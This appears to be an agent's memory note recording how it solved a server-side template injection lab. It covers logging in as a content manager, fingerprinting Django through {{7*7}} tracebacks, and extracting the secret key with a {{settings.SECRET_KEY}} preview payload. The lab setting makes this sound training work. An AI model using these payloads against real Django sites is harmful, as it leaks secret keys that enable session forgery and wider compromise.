---
metadata:
  node_type: memory
name: "SSTI info-disclosure via user-supplied objects"
description: "Django SSTI lab: content-manager -> /product/template editor; {{settings.SECRET_KEY}} in preview yields the framework secret key"
last_updated: 2026-10-10T07:06:13+08:00
created: 2026-10-10T07:06:13+08:00
---

Lab: lab-server-side-template-injection-with-information-disclosure-via-user-supplied-objects (arm A, solved).
Instance: range_launch launch-url <academy path> --jar /tmp/cj1.json -> base URL.

Surface trace:
1. GET /login -> csrf field name `csrf`; POST /login with content-manager:C0nt3ntM4n4g3r -> 302 /my-account?id=content-manager, session cookie set.
2. Home page has no extra link; the content-manager-only entry point is on the product page: GET /product?productId=1 shows `<a href=/product/template?productId=1>Edit template</a>`.
3. GET /product/template?productId=1 -> form POST to the same URL with fields csrf, template, template-action=preview|save. Default template uses `{{product.name}}` / `{{product.stock}}` / `{{product.price}}`; the rendered result lands in #preview-result.

Engine identification: previewing `{{7*7}}` 500s with a Django traceback (`django.template.exceptions.TemplateSyntaxError: Could not parse the remainder: '*7' from '7*7'`, python2.7 django). Arithmetic is unsupported -> Django, not Jinja/Twig/Handlebars.

Extraction: preview `P1={{settings.SECRET_KEY}}` renders the key directly (settings is reachable in the template context - the "user-supplied object" surface). {% debug %} was not needed.
Submit: POST /submitSolution with form answer=<key> -> {"correct":true}; banner_verdict -> solved:true plus congrats line.

Notes: template syntax errors leak full Django tracebacks in the preview page - a cheap engine-fingerprint oracle. The secret key is random per instance; submission is immediate, no button-click step.
